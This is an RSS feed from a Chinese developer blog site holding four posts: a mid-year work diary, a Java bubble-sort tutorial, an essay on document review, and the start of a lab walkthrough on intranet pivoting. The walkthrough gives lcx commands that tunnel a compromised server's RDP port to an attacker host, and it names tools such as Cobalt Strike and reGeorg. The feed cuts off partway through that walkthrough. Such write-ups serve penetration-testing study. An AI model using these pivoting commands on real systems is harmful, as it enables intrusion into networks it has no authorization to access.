<?xml version="1.0" encoding="utf-8"?>
<?xml-stylesheet type="text/xsl" href="css/feed.xsl"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:media="http://search.yahoo.com/mrss/" xmlns:og="http://ogp.me/ns#">
<channel>
<atom:link rel="self" href="http://192.168.1.4/fivefilters/makefulltextfeed.php?url=feed.cnblogs.com%2Fblog%2Fsitehome%2Frss&amp;max=10&amp;links=preserve&amp;exc=" />
<atom:link rel="alternate" title="Source URL" href="http://feed.cnblogs.com/blog/sitehome/rss" />
<atom:link rel="related" title="Subscribe to feed" href="http://www.subtome.com/#/subscribe?feeds=http%3A%2F%2F192.168.1.4%2Ffivefilters%2Fmakefulltextfeed.php%3Furl%3Dfeed.cnblogs.com%252Fblog%252Fsitehome%252Frss%26max%3D10%26links%3Dpreserve%26exc%3D&amp;back=http%3A%2F%2F192.168.1.4%2Ffivefilters%2Fmakefulltextfeed.php%3Furl%3Dfeed.cnblogs.com%252Fblog%252Fsitehome%252Frss%26max%3D10%26links%3Dpreserve%26exc%3D" />
<title>博客园_首页</title>
<link></link>
<description>代码改变世界</description>
<item>
<title>也曾妄想仗剑走天涯（年中总结） - 世界游戏猪脚</title>
<link>http://www.cnblogs.com/CreatingV/p/13286982.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/CreatingV/p/13286982.html</guid>
<description>&lt;p&gt;&lt;em&gt;&lt;span&gt;叮当当咚咚当当&lt;/span&gt;，2020&lt;span&gt;已经过去一半了，也是时候来篇总结，秀一秀了&lt;/span&gt;&lt;/em&gt;&lt;/p&gt;
&lt;h2&gt;工作：&lt;/h2&gt;
&lt;p&gt;感觉没啥可说的，早上到公司，电脑木有关。&lt;/p&gt;
&lt;p&gt;卡着点，打个卡，谢谢，谢谢&lt;/p&gt;
&lt;p&gt;8:00-9:00&lt;span&gt;吃着早餐，逛逛博客园，看看技术贴，点点赞，评论评论，一个小时过去了，可以开始工作了。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/2090873/202007/2090873-20200712082911596-399683941.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;9:00-9:15&lt;span&gt;今天的计划是什么，等我上个厕所回来想一想，想好了，开始吧。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;9:20---&lt;span&gt;打开&lt;/span&gt;&lt;span&gt;/&lt;/span&gt;&lt;span&gt;新建项目，找到昨天没有处理的问题，接着找，接着码，你们别找我聊天，我不空，我要写&lt;/span&gt;&lt;span&gt;bug&lt;/span&gt;&lt;span&gt;。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;没时间优化流程，没时间简洁代码，没有时间测试，只有先写了再说。&lt;/p&gt;
&lt;p&gt;（百度一下代码，测试一下功能，感觉没毛病就这样吧，一个函数完成了。继续）&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/2090873/202007/2090873-20200712082930740-747025659.png&quot; alt=&quot;&quot; width=&quot;291&quot; height=&quot;291&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;11:0---&lt;span&gt;点饭的时间到了，打开美团点外卖了，吃什么呢，这个动脑筋的事情感觉又要耗费我&lt;/span&gt;&lt;span&gt;10&lt;/span&gt;&lt;span&gt;来分钟，冒菜吧，快餐吧，炒菜吧（这个优惠力度大，满&lt;/span&gt;&lt;span&gt;20&lt;/span&gt;&lt;span&gt;减&lt;/span&gt;&lt;span&gt;20&lt;/span&gt;&lt;span&gt;，可惜全是折扣，换一个，这个满&lt;/span&gt;&lt;span&gt;20&lt;/span&gt;&lt;span&gt;减&lt;/span&gt;&lt;span&gt;10&lt;/span&gt;&lt;span&gt;，就他了吧），点完餐，继续码代码&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;午餐到了，可以提前开吃了，吃完饭，午休或游戏，等着下午上班吧。&lt;/p&gt;
&lt;p&gt;&lt;span&gt;此处省略&lt;/span&gt;1000&lt;span&gt;字，快&lt;/span&gt;&lt;span&gt;5&lt;/span&gt;&lt;span&gt;点了，加快进度了，不然又得加加班了。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;下班，收工。&lt;/p&gt;
&lt;p&gt;感觉一天就这样过去了，再来一个循环，感觉一周就这么过去了，再来一个循环，，半年过去了。。。（我是谁，我在哪儿，我在干嘛。）&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/2090873/202007/2090873-20200712083002647-1229340860.png&quot; alt=&quot;&quot; width=&quot;368&quot; height=&quot;368&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;h2&gt;学习：&lt;/h2&gt;
&lt;p&gt;&lt;span&gt;永恒不变的话题就是他了，可惜最近半年都没有买过书了，更多的学习是通过看博客，看帖子，看&lt;/span&gt;github&lt;span&gt;提供的代码，然后自己实践一下（大部分从头敲代码），写成了&lt;/span&gt;&lt;span&gt;demo&lt;/span&gt;&lt;span&gt;自己看看，跑一下。当然有条件的话，写一个使用说明或者出一个文章就更好了，加深印象是肯定的，因为毕竟你付出了文字，虽然仅仅是敲了键盘。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;翻了翻我看过的几本书，也算是重温了，虽然以前没有怎么看懂，也不知道应该看什么，但是这一次，看得更快了，但是也更理解了。因为书里面讲的我用过。&lt;/p&gt;
&lt;p&gt;进阶的提升，也许有的人自学，可以学习得很快，但是与我而言还是相信人民币玩家应该更快，因为这个原因，我加入了一个付费的知识星球，妄想一个知识星球就提高自己的专业水平。通过问问星主一些专业领域的问题，对自己的不足进行解惑。最开始几天感觉被坑了，星主不鸟我（难道是我提问没有付费，因为星球提问也是可以付费的，也可以免费），后来也回答了我，由于篇幅限制吧，也只是泛泛而谈，当然你如果想更深入了解掌握，可以看看星主的付费视频，里面有全面讲解。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/2090873/202007/2090873-20200712083020962-402060463.png&quot; alt=&quot;&quot; width=&quot;404&quot; height=&quot;281&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;好吧，等我必要了，我会付费的。（对真正有需求的人来说，付费是真的会付费的，因为我也准备付费了，不过还没有实践，有点犹豫不决）&lt;/p&gt;
&lt;p&gt;等上个月工资发了，我就来，你等着。&lt;/p&gt;
&lt;h2&gt;生活：&lt;/h2&gt;
&lt;p&gt;生活上，天气热了，买了热天的衣服（感觉生活没什么可以聊的）。&lt;/p&gt;
&lt;p&gt;要说有啥不一样，楼主买了几期彩票，打算一夜暴富。（顺带支持了福利事业）&lt;/p&gt;
&lt;p&gt;&lt;span&gt;呵呵，最后也没有空手而归，还是中了&lt;/span&gt;5&lt;span&gt;块。&lt;/span&gt;&lt;/p&gt;
&lt;h2&gt;娱乐：&lt;/h2&gt;
&lt;p&gt;&lt;span&gt;小说，又看完了一部别人的小说（&lt;/span&gt;500&lt;span&gt;多章）。当然在追的小说作者没更完，我也没有办法。其实以前也尝试过，写小说发展成为自己的副业，可是就写过那么十多章就放弃了，因为故事写完了。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;游戏，总是在输了一场之后，懊悔不已，感觉应该学习的。&lt;/p&gt;
&lt;h2&gt;附录：&lt;/h2&gt;
&lt;p&gt;想写一点有用的东西吧，不然又成水军了。&lt;/p&gt;
&lt;p&gt;有时候常常诞生很多想法，认为写出来（软件），绝对有人需要，绝对可以赚钱。后面写了一些，最后也就不了了之了。（写过一个代码生成器，还妄想赚钱）&lt;/p&gt;
&lt;p&gt;&lt;span&gt;如果你有一个想法了，不妨先等一下，再想一想，最好想出&lt;/span&gt;10&lt;span&gt;个还不错的想法，然后再从里面选择，&lt;/span&gt;&lt;span&gt;2,3&lt;/span&gt;&lt;span&gt;个你觉得能成，或者先阶段最能成的想法，然后来做他，这个就是你真正可以依赖的了，毕竟他们是从&lt;/span&gt;&lt;span&gt;10&lt;/span&gt;&lt;span&gt;个里面，诞生出来的，佼佼者了。&lt;/span&gt;&lt;/p&gt;
&lt;h2&gt;彩蛋：&lt;/h2&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/2090873/202007/2090873-20200712083038650-1215217401.png&quot; alt=&quot;&quot; width=&quot;385&quot; height=&quot;383&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;顺便分享几个我的想法吧。&lt;/p&gt;
&lt;p&gt;1、&lt;span&gt;一个为想法，点子，&lt;/span&gt;Idea&lt;span&gt;付费的网站&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;2、一个依赖协议算法运营的站点&lt;/p&gt;
&lt;p&gt;&lt;span&gt;　　平台：提供基本的算法和（&lt;/span&gt;100&lt;span&gt;种以上），提供基础的&lt;/span&gt;&lt;span&gt;js&lt;/span&gt;&lt;span&gt;引擎的功能&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;　　服务商：提供一些，特定的&lt;/span&gt;APP&lt;span&gt;，或者特定程序，或者某些协议需要用到的算法，并且用平台提供的&lt;/span&gt;&lt;span&gt;js&lt;/span&gt;&lt;span&gt;扩展功能，完成代码算法。（服务商标记价格）&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;　　用户：通过平台，使用服务商的算法，（&lt;/span&gt;http&lt;span&gt;请求的方式调用）。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;　　具体的运营或者维护，就靠自己想了。&lt;/p&gt;
</description>
<pubDate>Sun, 12 Jul 2020 00:32:00 +0000</pubDate>
<dc:creator>世界游戏猪脚</dc:creator>
<og:description>叮当当咚咚当当，2020已经过去一半了，也是时候来篇总结，秀一秀了 工作： 感觉没啥可说的，早上到公司，电脑木有关。 卡着点，打个卡，谢谢，谢谢 8:00-9:00吃着早餐，逛逛博客园，看看技术贴，点</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/CreatingV/p/13286982.html</dc:identifier>
</item>
<item>
<title>看动画学算法之:排序-冒泡排序 - flydean</title>
<link>http://www.cnblogs.com/flydean/p/algorithm-bubble-sort.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/flydean/p/algorithm-bubble-sort.html</guid>
<description>&lt;p&gt;排序可能是所有的算法中最最基础和最最常用的了。排序是一个非常经典的问题，它以一定的顺序对一个数组（或一个列表）中的项进行重新排序。&lt;/p&gt;
&lt;p&gt;排序算法有很多种，每个都有其自身的优点和局限性。&lt;/p&gt;
&lt;p&gt;今天我们来学习最最简单的冒泡排序算法。&lt;/p&gt;

&lt;p&gt;冒泡排序的原理很简单，我们想象一下一个一个的气泡上浮的过程。&lt;/p&gt;
&lt;p&gt;假设我们有八个数字 29,10,14,37,20,25,44,15 要进行排序。&lt;/p&gt;
&lt;p&gt;我们先用一个动画图来直观的观察一下整个冒泡排序的过程：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img-blog.csdnimg.cn/20200708155735461.gif&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;排序共进行八轮，每一轮都会做两两比较，并将较大的元素右移，就像冒泡一下。&lt;/p&gt;
&lt;p&gt;一轮结束之后，八个元素中最大的那个元素44将会移动到最右边。&lt;/p&gt;
&lt;p&gt;然后再重复其他的几轮。最终得到一个完全排序的数组。&lt;/p&gt;
&lt;p&gt;也可以这样看：&lt;/p&gt;
&lt;p&gt;第一轮是将八个元素中的最大值44交换移动到最右位置。&lt;br/&gt;第二轮是将八个元素中的次大值37交换移动到最右位置。&lt;br/&gt;以此类推。&lt;/p&gt;

&lt;p&gt;我们先看一个最简单的冒泡算法：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;public class BubbleSort {

    public void doBubbleSort(int[] array){
        log.info(&quot;排序前的数组为:{}&quot;,array);
        //外层循环,遍历所有轮数
        for(int i=0; i&amp;lt; array.length-1; i++){
            //内层循环，两两比较，选中较大的数字，进行交换
            for(int j=0; j&amp;lt;array.length-1; j++){
                if(array[j]&amp;gt;array[j+1]){
                    //交换两个数字
                    int temp = array[j];
                    array[j] = array[j+1];
                    array[j+1] = temp;
                }
            }
            log.info(&quot;第{}轮排序后的数组为:{}&quot;, i+1, array);
        }
    }

    public static void main(String[] args) {
        int[] array= {29,10,14,37,20,25,44,15};
        BubbleSort bubbleSort=new BubbleSort();
        bubbleSort.doBubbleSort(array);
    }

}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;这个算法就是两层遍历，外层遍历表示的是进行的轮数。内层遍历表示的是每一轮的排序。&lt;/p&gt;
&lt;p&gt;我们看下输出结果：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img-blog.csdnimg.cn/2020070816421585.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_0,text_aHR0cDovL3d3dy5mbHlkZWFuLmNvbQ==,size_30,color_8F8F8F,t_70&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;

&lt;p&gt;分析上面的遍历过程，我们可以发现，第一次排序之后，44已经放到最右边的位置了，已经排好序了。&lt;/p&gt;
&lt;p&gt;第二次排序之后，37也已经排好序了。每过一轮，内部循环需要比较的次数就可以减一。&lt;/p&gt;
&lt;p&gt;这就意味着，在内部循环的时候，我们只需要进行array.length-i-1次比较就可以了。&lt;/p&gt;
&lt;p&gt;修改代码如下：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;public class BubbleSort1 {

    public void doBubbleSort(int[] array){
        log.info(&quot;排序前的数组为:{}&quot;,array);
        //外层循环,遍历所有轮数
        for(int i=0; i&amp;lt; array.length-1; i++){
            //内层循环，两两比较，选中较大的数字，进行交换, 最后的i个数字已经排完序了，不需要再进行比较
            for(int j=0; j&amp;lt;array.length-i-1; j++){
                if(array[j]&amp;gt;array[j+1]){
                    //交换两个数字
                    int temp = array[j];
                    array[j] = array[j+1];
                    array[j+1] = temp;
                }
            }
            log.info(&quot;第{}轮排序后的数组为:{}&quot;, i+1, array);
        }
    }

    public static void main(String[] args) {
        int[] array= {29,10,14,37,20,25,44,15};
        BubbleSort1 bubbleSort=new BubbleSort1();
        bubbleSort.doBubbleSort(array);
    }

}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;运行结果：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img-blog.csdnimg.cn/20200708164629451.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_0,text_aHR0cDovL3d3dy5mbHlkZWFuLmNvbQ==,size_30,color_8F8F8F,t_70&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;可以看到运行结果其实没什么不同，只不过我们少做了几次比较。&lt;/p&gt;

&lt;p&gt;从上面的结果，我们可以看到实际上第5轮排序过后就已经排序完成了。但是我们仍然进行了第6，7次排序。&lt;/p&gt;
&lt;p&gt;有没有什么办法可以判断排序是不是已经完成了呢？&lt;/p&gt;
&lt;p&gt;我们考虑一下，在内部循环中，我们是进行两两比较，然后交换位置。&lt;/p&gt;
&lt;p&gt;如果在某一次遍历中，没有进行交互，这就意味着排序已经完成了。&lt;/p&gt;
&lt;p&gt;所以我们可以再引入一个flag来做判断。&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;public class BubbleSort2 {

    public void doBubbleSort(int[] array){
        log.info(&quot;排序前的数组为:{}&quot;,array);
        //外层循环,遍历所有轮数
        for(int i=0; i&amp;lt; array.length-1; i++){
            //添加一个flag，如果这一轮都没有排序，说明排序已经结束，可以提前退出
            boolean flag=false;
            //内层循环，两两比较，选中较大的数字，进行交换, 最后的i个数字已经排完序了，不需要再进行比较
            for(int j=0; j&amp;lt;array.length-i-1; j++){
                if(array[j]&amp;gt;array[j+1]){
                    //交换两个数字
                    int temp = array[j];
                    array[j] = array[j+1];
                    array[j+1] = temp;
                    flag = true;
                }
            }
            log.info(&quot;第{}轮排序后的数组为:{}&quot;, i+1, array);
            if(!flag)
            {
                log.info(&quot;本轮未发生排序变化，排序结束&quot;);
                return;
            }
        }
    }

    public static void main(String[] args) {
        int[] array= {29,10,14,37,20,25,44,15};
        BubbleSort2 bubbleSort=new BubbleSort2();
        bubbleSort.doBubbleSort(array);
    }

}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;运行结果如下：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img-blog.csdnimg.cn/20200708165143914.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_0,text_aHR0cDovL3d3dy5mbHlkZWFuLmNvbQ==,size_30,color_8F8F8F,t_70&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;从结果我们可以看到少了一轮排序，提升了速度。&lt;/p&gt;

&lt;p&gt;虽然我们可以在冒泡的时候进行一些性能优化，但是基本上还是要进行嵌套的两次遍历。遍历次数近似的=n*n，所以冒泡排序算法的时间复杂度是O(n²)。&lt;/p&gt;
&lt;p&gt;本文的代码地址：&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://github.com/ddean2009/learn-algorithm/tree/master/sorting&quot;&gt;learn-algorithm&lt;/a&gt;&lt;/p&gt;
&lt;blockquote readability=&quot;9.0278884462151&quot;&gt;
&lt;p&gt;本文已收录于 &lt;a href=&quot;http://www.flydean.com/algorithm-bubble-sort/&quot;&gt;http://www.flydean.com/algorithm-bubble-sort/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;最通俗的解读，最深刻的干货，最简洁的教程，众多你不知道的小技巧等你来发现！&lt;/p&gt;
&lt;p&gt;欢迎关注我的公众号:「程序那些事」,懂技术，更懂你！&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img src=&quot;https://img-blog.csdnimg.cn/20200709152618916.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
</description>
<pubDate>Sun, 12 Jul 2020 00:32:00 +0000</pubDate>
<dc:creator>flydean</dc:creator>
<og:description>简介 排序可能是所有的算法中最最基础和最最常用的了。排序是一个非常经典的问题，它以一定的顺序对一个数组（或一个列表）中的项进行重新排序。 排序算法有很多种，每个都有其自身的优点和局限性。 今天我们来学</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/flydean/p/algorithm-bubble-sort.html</dc:identifier>
</item>
<item>
<title>文档评审的四个维度 - doubleicon</title>
<link>http://www.cnblogs.com/doubleicon/p/13286981.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/doubleicon/p/13286981.html</guid>
<description>&lt;p&gt;&lt;span&gt;  最近二年的时间，写的文档、审过的管理办法及见过的项目建设方案等，要比我过去几年写的，审的、见得都要多，从一开始的毫无头绪，到现在轻车熟路，走过的这么一段煎熬的心路历程，不忘初心，简单分享，同时也算是对自己工作的总结回顾。&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;&lt;span&gt;  如果让我来对一个文档进行评审，我主要会从以下四个维度对文档进行评审，分别是目的、结构、内容、人员四个方面来对一份文档进行评审，下面我们逐个展开来说。&lt;/span&gt;&lt;/p&gt;
&lt;h2&gt;1、目的&lt;/h2&gt;
&lt;p&gt;&lt;span&gt;  目的是我们整理该文档的价值所在，如果不清楚整理该文档的目的，那么这个文档一定不是一个合格的文档，在我们已经清楚了整理该文档的目的后，接下来我们就需要思考通过该文档能否达到预想的目的，通过什么渠道到达我们读者的手里，该文档署名是什么？有疑问了谁负责解释？&lt;/span&gt;&lt;/p&gt;
&lt;h2&gt;2、结构&lt;/h2&gt;
&lt;p&gt;&lt;span&gt;  结构决定了一个文档的脉络是否清晰，好的文档结构更易于读者的理解，给读者一种层次分明的感觉，不会让读者认为作者思维混乱，结构我们从两个方面来评价，分别是标题与内容，就包括标题大、内容小，标题小、内容大及标题与内容不匹配等方面开老师，另外一个就是结构是否合理，包括出现的先后顺序、结构是否处于同一纬度，同类的是否进行了合并及同类的是否需要进行合并等方面进行考虑。&lt;/span&gt;&lt;/p&gt;
&lt;h2&gt;3、内容&lt;/h2&gt;
&lt;p&gt;&lt;span&gt;  内容是一个文档的灵魂，基本决定了这个文档是否能够达到预想的目的，可以从以下几个方面来对内容进行评价，包括内容覆盖是否全面、表达是否前后呼应、是否存在前后矛盾或者不一致的地方、语言的表达方式是否与读者同处一个频道上(读者是否能够理解)、语句是否通顺、关键的字句是否有错别字会出现引起误解、想要表达的意思是否表达到了、表达的语言是否精简、颗粒度的划分是否合适、与其他文档的关系及其他外部的联系、描述的内容与当前所处的阶段是否匹配等方面。&lt;/span&gt;&lt;/p&gt;
&lt;h2&gt;4、人员&lt;/h2&gt;
&lt;p&gt;&lt;span&gt;  人员是一个文档的核心，包括面向的读者是谁？牵扯到的人员及各自的角色职责是否清晰、站在那个角度写的该文档等方面。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/651968/202007/651968-20200712082739394-1027970259.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;&lt;span&gt;  以上是本人近一年审核制度、管理办法、项目建设方案、可研论证及项目验收材料等文档时，对于如何评审文档的一些思考，如果你也有相应的方法论及思路，欢迎你在下面留言，让我们一起探讨提高。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/651968/202007/651968-20200712082830302-2094367054.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/span&gt;&lt;/p&gt;
</description>
<pubDate>Sun, 12 Jul 2020 00:31:00 +0000</pubDate>
<dc:creator>doubleicon</dc:creator>
<og:description>一、前言 最近二年的时间，写的文档、审过的管理办法及见过的项目建设方案等，要比我过去几年写的，审的、见得都要多，从一开始的毫无头绪，到现在轻车熟路，走过的这么一段煎熬的心路历程，不忘初心，简单分享，同</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/doubleicon/p/13286981.html</dc:identifier>
</item>
<item>
<title>内网渗透—流量转发 - sijidou</title>
<link>http://www.cnblogs.com/sijidou/p/13286938.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/sijidou/p/13286938.html</guid>
<description>&lt;h4 id=&quot;0x00前言&quot;&gt;0x00前言&lt;/h4&gt;
&lt;p&gt;在拿到一台服务器的shell的时候，如果想要更进一步渗透测试，则需要进行内网渗透&lt;/p&gt;
&lt;p&gt;而内网渗透的第一步就是挂代理，首先需要明确一个概念，在日常生活中常用&lt;code&gt;vpn&lt;/code&gt;挂代理去google查资料，自己搭过&lt;code&gt;vpn&lt;/code&gt;的人都知道，要在买的&lt;code&gt;vps&lt;/code&gt;上搭建&lt;code&gt;ss的服务器端&lt;/code&gt;，之后在&lt;code&gt;自己电脑&lt;/code&gt;上下载&lt;code&gt;ss的客户端&lt;/code&gt;，确定对应的加密协议和密码就能成功转发&lt;/p&gt;
&lt;p&gt;而在内网渗透的流量转发是一个道理，是在拿到shell的服务器上使用工具让它变成代理的服务器端，之后在本机使用客户端工具进行连接&lt;/p&gt;
&lt;h4 id=&quot;0x01流量转发工具&quot;&gt;0x01流量转发工具&lt;/h4&gt;
&lt;h5 id=&quot;需要放在拿到shell的服务器的服务器端可使用&quot;&gt;需要放在拿到shell的服务器的服务器端可使用&lt;/h5&gt;
&lt;p&gt;1.&lt;code&gt;lcx&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;2.&lt;code&gt;msf&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;3.&lt;code&gt;cobalt Strike&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;4.&lt;code&gt;earthworm&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;5.&lt;code&gt;reGeorg&lt;/code&gt;&lt;/p&gt;
&lt;h5 id=&quot;本地的客户端可以使用&quot;&gt;本地的客户端可以使用&lt;/h5&gt;
&lt;p&gt;&lt;strong&gt;windows&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;1.&lt;code&gt;proxifier&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;2.&lt;code&gt;SocksCap64&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;linux&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;1.&lt;code&gt;proxychains&lt;/code&gt;&lt;/p&gt;
&lt;h4 id=&quot;0x02-本次测试的环境&quot;&gt;0x02 本次测试的环境&lt;/h4&gt;
&lt;p&gt;本次环境是公司搭的一个一层内网学习环境，本篇文章只总结流量转发的方法，因此大致介绍下简化的拓扑结构&lt;/p&gt;
&lt;p&gt;攻击机：&lt;/p&gt;
&lt;p&gt;ip：&lt;code&gt;10.86.0.87&lt;/code&gt; win10（该ip能访问到最外层的DMZ区web服务器）&lt;/p&gt;
&lt;p&gt;ip: &lt;code&gt;xx.xx.xx.xx&lt;/code&gt; kali (虚拟机，与主机win10 进行NAT连接)&lt;/p&gt;
&lt;p&gt;被攻击机：&lt;/p&gt;
&lt;p&gt;ip: &lt;code&gt;172.16.3.145&lt;/code&gt; ，&lt;code&gt;192.168.93.143&lt;/code&gt; web服务器（双网卡，192为内网ip）&lt;/p&gt;
&lt;p&gt;ip: &lt;code&gt;192.168.93.138&lt;/code&gt; 内网服务器，上面80有个IIS服务（能访问到该web，则说明代理成功）&lt;/p&gt;
&lt;p&gt;明确个概念&lt;br/&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1419450/202007/1419450-20200712074638650-1047874211.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;那么&lt;code&gt;DMZ区服务器&lt;/code&gt;弹shell到&lt;code&gt;kali虚拟机&lt;/code&gt;要通过本机做端口映射，&lt;code&gt;kali&lt;/code&gt;要访问&lt;code&gt;内网web服务器&lt;/code&gt;则代理需要设置成本机的端口&lt;/p&gt;
&lt;h4 id=&quot;0x03-lcx转发&quot;&gt;0x03 lcx转发&lt;/h4&gt;
&lt;p&gt;本工具只是端口流量转发，并不具备完整的proxy代理功能&lt;/p&gt;
&lt;p&gt;举个例子服务器只能本地连3389，因此攻击机连不了，但是可以通过该工具将3389转发到攻击机的端口上，就能连接了&lt;/p&gt;
&lt;p&gt;拿到shell后，上传&lt;code&gt;lcx.exe&lt;/code&gt;文件&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1419450/202007/1419450-20200712074648345-1192678217.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;h5 id=&quot;将自身端口流量转发到攻击机端口上&quot;&gt;将自身端口流量转发到攻击机端口上&lt;/h5&gt;
&lt;p&gt;使用方法&lt;/p&gt;
&lt;p&gt;本机&lt;/p&gt;
&lt;p&gt;接收2333端口来的流量，并在自己的2334端口打开&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;lcx.exe –listen 2333 2334
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1419450/202007/1419450-20200712074658319-1233270304.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1419450/202007/1419450-20200712074743261-166155685.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;目标服务器&lt;/p&gt;
&lt;p&gt;将自己的3389的流量转发到&lt;code&gt;10.86.0.87攻击机&lt;/code&gt;的2333端口上&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;lcx.exe -slave 10.86.0.87 2333 127.0.0.1 3389
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1419450/202007/1419450-20200712074708330-1241748632.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;rdp连接自己的2334端口&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1419450/202007/1419450-20200712074719110-1787114422.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;h5 id=&quot;本身流量转发&quot;&gt;本身流量转发&lt;/h5&gt;
&lt;p&gt;这玩意儿还能在自己的上进行端口转发，比如把3389端口流量转到自己的2333端口&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;lcx.exe -tran 2333 127.0.0.1 3389
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1419450/202007/1419450-20200712074840900-373956289.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;h3 id=&quot;0x04-msf&quot;&gt;0x04 msf&lt;/h3&gt;
&lt;p&gt;msf它本身有流量转发的模块，因为本次的msf是在kali虚拟机里面的，又因为DMZ区服务器是没法访问到kali的，意味着反弹shell是没法直接实现的&lt;/p&gt;
&lt;p&gt;在使用msf转发前，使用&lt;code&gt;frp&lt;/code&gt;将kali的监听端口映射到本机上&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;在本机中使用frps服务器端&lt;/strong&gt;&lt;/p&gt;
